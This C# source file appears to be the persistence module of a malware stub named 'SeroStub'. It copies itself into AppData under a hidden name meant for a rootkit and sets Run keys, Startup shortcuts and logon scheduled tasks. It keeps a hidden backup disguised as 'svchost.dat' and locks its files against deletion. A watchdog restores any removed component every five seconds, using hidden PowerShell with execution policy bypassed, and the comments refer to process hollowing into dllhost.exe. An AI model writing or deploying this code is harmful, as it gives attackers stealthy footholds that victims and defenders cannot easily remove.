using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace SeroStub;

internal static partial class Persistence
{
    private const string RunKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";

    public static string? GetInstalledPath(string name)
    {
        try
        {
            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var installDir = Path.Combine(appData, name);
            if (!Directory.Exists(installDir)) return null;

            // Prefer the exact configured filename
            var exactPath = Path.Combine(installDir, Config.HiddenFileName);
            if (File.Exists(exactPath)) return exactPath;

            // Fallback to any exe
            var exes = Directory.GetFiles(installDir, "*.exe");
            return exes.Length > 0 ? exes[0] : null;
        }
        catch { return null; }
    }

    /// <summary>
    /// Ensures the exe is installed in AppData. Returns the install path if we need to
    /// relaunch from there (caller should exit). Returns null if already running from install dir.
    /// When isAdmin=true, copies the file but does NOT relaunch (to preserve elevation).
    /// When allowMultiInstance=true, does NOT relaunch to allow multiple instances.
    /// </summary>
    public static string? EnsureInstalled(string name, bool isAdmin = false, bool allowMultiInstance = false)
    {
        try
        {
            var selfPath = Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) return null;

            var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            var installDir = Path.Combine(appData, name);
            // Use HiddenFileName so the rootkit can hide it
            var installExe = Path.Combine(installDir, Config.HiddenFileName);

            // Already running from install directory
            if (selfPath.StartsWith(installDir, StringComparison.OrdinalIgnoreCase))
                return null;

            // Copy to AppData
            Directory.CreateDirectory(installDir);
            File.Copy(selfPath, installExe, true);
            StubLog.Debug($"Persistence: copied to {installDir}");

            // If admin or multi-instance, don't relaunch
            if (isAdmin || allowMultiInstance)
            {
                return null;
            }

            // Launch from install location
            System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            {
                FileName = installExe,
                UseShellExecute = false,
                CreateNoWindow = true
            });

            return installExe;
        }
        catch (Exception ex)
        {
            StubLog.Error($"Persistence install failed: {ex.GetType().Name}");
            return null; // Continue from current location
        }
    }

    // ── Registry (HKCU\Run) ──
    public static void InstallRegistry(string name)
    {
        try
        {
            // Prefer installed path (in AppData) over ProcessPath which may be dllhost.exe when hollowed
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) { StubLog.Error("Persistence: no process path"); return; }

            using var key = Registry.CurrentUser.OpenSubKey(RunKey, true);
            if (key?.GetValue(name) is string val && val == selfPath) return;
            key?.SetValue(name, selfPath);
            StubLog.Info($"Persistence: registry key set ({name})");
        }
        catch (Exception ex) { StubLog.Error($"Persistence registry install failed: {ex.Message}"); }
    }

    public static void RemoveRegistry(string name)
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(RunKey, true);
            key?.DeleteValue(name, false);
            StubLog.Info($"Persistence: registry key removed ({name})");
        }
        catch (Exception ex) { StubLog.Error($"Persistence registry remove failed: {ex.Message}"); }
    }

    // ── Startup Folder (.lnk) ──
    public static void InstallStartup(string name)
    {
        try
        {
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) { StubLog.Error("Persistence: no process path"); return; }

            var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            if (string.IsNullOrEmpty(startupDir))
                startupDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    @"Microsoft\Windows\Start Menu\Programs\Startup");
            Directory.CreateDirectory(startupDir);
            var lnkPath = Path.Combine(startupDir, $"{name}.lnk");

            if (File.Exists(lnkPath)) return;

            // Escape single quotes in paths for PowerShell
            var escapedLnk = lnkPath.Replace("'", "''");
            var escapedTarget = selfPath.Replace("'", "''");
            var ps = $"$s=(New-Object -ComObject WScript.Shell).CreateShortcut('{escapedLnk}');$s.TargetPath='{escapedTarget}';$s.Save()";
            var proc = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -WindowStyle Hidden -Command \"{ps}\"",
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true
            });
            if (proc != null)
            {
                proc.WaitForExit(10000);
                var err = proc.StandardError.ReadToEnd();
                if (!string.IsNullOrEmpty(err))
                    StubLog.Error($"Persistence: PS error: {err.Trim()}");
            }

            if (File.Exists(lnkPath))
                StubLog.Info($"Persistence: startup shortcut created ({lnkPath}) -> {selfPath}");
            else
                StubLog.Error($"Persistence: shortcut NOT created at {lnkPath}");
        }
        catch (Exception ex) { StubLog.Error($"Persistence startup install failed: {ex.Message}"); }
    }

    public static void RemoveStartup(string name)
    {
        try
        {
            var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            if (string.IsNullOrEmpty(startupDir))
                startupDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    @"Microsoft\Windows\Start Menu\Programs\Startup");
            var lnkPath = Path.Combine(startupDir, $"{name}.lnk");
            if (File.Exists(lnkPath)) File.Delete(lnkPath);
            StubLog.Info($"Persistence: startup shortcut removed ({name})");
        }
        catch (Exception ex) { StubLog.Error($"Persistence startup remove failed: {ex.Message}"); }
    }

    // ── Scheduled Task (invisible in Task Manager Startup tab) ──
    public static void InstallScheduledTask(string name)
    {
        try
        {
            // Prefer installed path over ProcessPath (may be dllhost.exe when hollowed)
            var selfPath = GetInstalledPath(name) ?? Environment.ProcessPath;
            if (string.IsNullOrEmpty(selfPath)) { StubLog.Error("Persistence: no process path"); return; }

            // Use PowerShell Register-ScheduledTask -- works for user-level tasks without admin
            var user   = Environment.UserName.Replace("'", "''");
            var domain = Environment.UserDomainName.Replace("'", "''");
            var psCmd = $@"
$taskName = '{name}'
$exePath = '{selfPath.Replace("'", "''")}'
$existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if ($existing) {{ exit 0 }}
$action = New-ScheduledTaskAction -Execute $exePath
$trigger = New-ScheduledTaskTrigger -AtLogOn -User '{domain}\{user}'
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit ([TimeSpan]::Zero)
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force
";

            var result = RunPowerShell(psCmd);
            StubLog.Info($"Persistence: scheduled task created ({name}) {result.Trim()}");
        }
        catch (Exception ex) { StubLog.Error($"Persistence scheduled task install failed: {ex.Message}"); }
    }

    public static void RemoveScheduledTask(string name)
    {
        try
        {
            var psCmd = $"Unregister-ScheduledTask -TaskName '{name}' -Confirm:$false -ErrorAction SilentlyContinue";
            RunPowerShell(psCmd);
            StubLog.Info($"Persistence: scheduled task removed ({name})");
        }
        catch (Exception ex) { StubLog.Error($"Persistence scheduled task remove failed: {ex.Message}"); }
    }

    // ── Watchdog ──

    private static FileStream? _exeLock;
    private static FileStream? _lnkLock;
    private static FileStream? _backupLock;
    private static volatile bool _watchdogRunning;
    // Cached at StartWatchdog — prevents path divergence between FSW, RestoreAll and polling
    private static string? _cachedLnkPath;
    private static string? _cachedStartupDir;

    /// <summary>
    /// Starts an aggressive persistence watchdog that:
    /// 1. Locks the installed exe + .lnk to prevent deletion
    /// 2. Keeps a hidden backup copy in LocalAppData
    /// 3. Uses FileSystemWatcher for instant re-creation on deletion
    /// 4. Polls every 5s as fallback
    /// </summary>
    public static void StopWatchdog()
    {
        _watchdogRunning = false;
        // Release all file locks so uninstall can delete the files
        try { _exeLock?.Dispose(); } catch { } finally { _exeLock = null; }
        try { _lnkLock?.Dispose(); } catch { } finally { _lnkLock = null; }
        try { _backupLock?.Dispose(); } catch { } finally { _backupLock = null; }
        StubLog.Info("Watchdog: stopped, all file locks released.");
    }

    public static void StartWatchdog(string name)
    {
        if (_watchdogRunning) return;
        _watchdogRunning = true;

        var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        var installDir = Path.Combine(appData, name);
        var installExe = Path.Combine(installDir, Config.HiddenFileName);

        // Hidden backup in LocalAppData with a different name
        var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        var backupDir = Path.Combine(localAppData, "Microsoft", "WindowsServices");
        var backupExe = Path.Combine(backupDir, "svchost.dat");

        // Create backup immediately
        CreateBackup(installExe, backupDir, backupExe);

        // Lock files to prevent deletion
        _exeLock = LockFile(installExe);
        _backupLock = LockFile(backupExe);

        // Lock the .lnk — resolve and cache the path once here so every code path uses the same string
        if (Config.PersistStartup)
        {
            _cachedStartupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            if (string.IsNullOrEmpty(_cachedStartupDir))
                _cachedStartupDir = Path.Combine(appData, @"Microsoft\Windows\Start Menu\Programs\Startup");
            _cachedLnkPath = Path.Combine(_cachedStartupDir, $"{name}.lnk");
            _lnkLock = LockFile(_cachedLnkPath);
        }

        // FileSystemWatcher on install directory -- instant reaction
        try
        {
            var watcher = new FileSystemWatcher(installDir)
            {
                NotifyFilter = NotifyFilters.FileName | NotifyFilters.LastWrite,
                EnableRaisingEvents = true
            };
            watcher.Deleted += (_, e) =>
            {
                StubLog.Info($"Watchdog: file deleted detected: {e.Name}");
                Thread.Sleep(500); // Brief delay to let the delete complete
                RestoreAll(name, installExe, backupDir, backupExe);
            };
            watcher.Renamed += (_, e) =>
            {
                StubLog.Info($"Watchdog: file renamed detected: {e.OldName} -> {e.Name}");
                Thread.Sleep(500);
                RestoreAll(name, installExe, backupDir, backupExe);
            };
        }
        catch (Exception ex) { StubLog.Error($"Watchdog: FSW failed: {ex.Message}"); }

        // FileSystemWatcher on startup folder — uses cached path
        if (Config.PersistStartup && _cachedStartupDir != null)
        {
            try
            {
                if (Directory.Exists(_cachedStartupDir))
                {
                    var startupFsw = new FileSystemWatcher(_cachedStartupDir)
                    {
                        NotifyFilter = NotifyFilters.FileName,
                        Filter = $"{name}.lnk",
                        EnableRaisingEvents = true
                    };
                    startupFsw.Deleted += (_, _) =>
                    {
                        StubLog.Info("Watchdog: .lnk deleted, recreating...");
                        Thread.Sleep(500);
                        _lnkLock?.Dispose(); _lnkLock = null;
                        InstallStartup(name);
                        _lnkLock = LockFile(_cachedLnkPath!);
                    };
                }
            }
            catch (Exception ex) { StubLog.Error($"Watchdog: startup FSW failed: {ex.Message}"); }
        }

        // Background polling thread as fallback (every 5 seconds)
        var thread = new Thread(() => WatchdogLoop(name, installExe, backupDir, backupExe))
        {
            IsBackground = true,
            Priority = ThreadPriority.BelowNormal
        };
        thread.Start();

        StubLog.Info("Watchdog: started (locks + watchers + 5s poll)");
    }

    private static void WatchdogLoop(string name, string installExe, string backupDir, string backupExe)
    {
        while (_watchdogRunning)
        {
            try
            {
                Thread.Sleep(5000);
                RestoreAll(name, installExe, backupDir, backupExe);
            }
            catch (Exception ex) { StubLog.Error($"Watchdog poll error: {ex.Message}"); }
        }
    }

    private static void RestoreAll(string name, string installExe, string backupDir, string backupExe)
    {
        // 1. Ensure the exe exists in AppData
        if (!File.Exists(installExe))
        {
            StubLog.Info("Watchdog: exe missing, restoring...");
            _exeLock?.Dispose(); _exeLock = null;

            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(installExe)!);
                // Try to restore from backup
                if (File.Exists(backupExe))
                {
                    File.Copy(backupExe, installExe, true);
                    StubLog.Info("Watchdog: exe restored from backup");
                }
                else
                {
                    // Last resort: copy from current process
                    var selfPath = Environment.ProcessPath;
                    if (!string.IsNullOrEmpty(selfPath) && File.Exists(selfPath))
                    {
                        File.Copy(selfPath, installExe, true);
                        StubLog.Info("Watchdog: exe restored from self");
                    }
                }
                _exeLock = LockFile(installExe);
            }
            catch (Exception ex) { StubLog.Error($"Watchdog: exe restore failed: {ex.Message}"); }
        }

        // 2. Ensure backup exists
        if (!File.Exists(backupExe))
        {
            _backupLock?.Dispose(); _backupLock = null;
            CreateBackup(installExe, backupDir, backupExe);
            _backupLock = LockFile(backupExe);
        }

        // 3. Re-check persistence entries
        if (Config.PersistRegistry && !IsRegistryInstalled(name))
        {
            StubLog.Info("Watchdog: registry entry missing, recreating...");
            InstallRegistry(name);
        }

        if (Config.PersistStartup && !IsStartupInstalled(name))
        {
            StubLog.Info("Watchdog: startup shortcut missing, recreating...");
            _lnkLock?.Dispose(); _lnkLock = null;
            InstallStartup(name);
            // Use cached path — avoids computing a different path than the one we locked at startup
            _lnkLock = LockFile(_cachedLnkPath ?? Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Startup), $"{name}.lnk"));
        }

        if (Config.PersistTask && !IsTaskInstalled(name))
        {
            StubLog.Info("Watchdog: scheduled task missing, recreating...");
            InstallScheduledTask(name);
        }
    }

    // ── Check methods ──

    public static bool IsRegistryInstalled(string name)
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(RunKey, false);
            return key?.GetValue(name) != null;
        }
        catch { return false; }
    }

    public static bool IsStartupInstalled(string name)
    {
        try
        {
            // Prefer cached path (same as what the lock and FSW watch)
            var lnkPath = _cachedLnkPath;
            if (lnkPath == null)
            {
                var startupDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                if (string.IsNullOrEmpty(startupDir))
                    startupDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        @"Microsoft\Windows\Start Menu\Programs\Startup");
                lnkPath = Path.Combine(startupDir, $"{name}.lnk");
            }
            return File.Exists(lnkPath);
        }
        catch { return false; }
    }

    private static DateTime _lastTaskCheck = DateTime.MinValue;
    private static bool _lastTaskResult = true;

    public static bool IsTaskInstalled(string name)
    {
        try
        {
            // Cache result for 60s to avoid spawning powershell every 5s
            if ((DateTime.UtcNow - _lastTaskCheck).TotalSeconds < 60)
                return _lastTaskResult;

            var output = RunPowerShell($"Get-ScheduledTask -TaskName '{name}' -ErrorAction SilentlyContinue | Select-Object -ExpandProperty TaskName");
            _lastTaskResult = output.Trim().Equals(name, StringComparison.OrdinalIgnoreCase);
            _lastTaskCheck = DateTime.UtcNow;
            return _lastTaskResult;
        }
        catch { return false; }
    }

    private static void CreateBackup(string sourceExe, string backupDir, string backupExe)
    {
        try
        {
            Directory.CreateDirectory(backupDir);
            if (File.Exists(sourceExe))
            {
                File.Copy(sourceExe, backupExe, true);
                // Hide the backup
                File.SetAttributes(backupExe, FileAttributes.Hidden | FileAttributes.System);
                File.SetAttributes(backupDir, FileAttributes.Hidden);
                StubLog.Info("Watchdog: backup created");
            }
        }
        catch (Exception ex) { StubLog.Error($"Watchdog: backup failed: {ex.Message}"); }
    }

    private static FileStream? LockFile(string path)
    {
        try
        {
            if (!File.Exists(path)) return null;
            // Open with FileShare.Read -- others can read but NOT delete or write
            return new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
        }
        catch { return null; }
    }

    private static string RunPowerShell(string command)
    {
        try
        {
            var psi = new System.Diagnostics.ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"{command.Replace("\"", "\\\"")}\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden
            };
            using var proc = System.Diagnostics.Process.Start(psi);
            if (proc == null) return "";
            var output = proc.StandardOutput.ReadToEnd();
            var error = proc.StandardError.ReadToEnd();
            proc.WaitForExit(15000);
            if (!string.IsNullOrEmpty(error)) StubLog.Error($"Persistence PS error: {error.Trim()}");
            return output;
        }
        catch (Exception ex) { StubLog.Error($"RunPowerShell failed: {ex.Message}"); return ""; }
    }
}
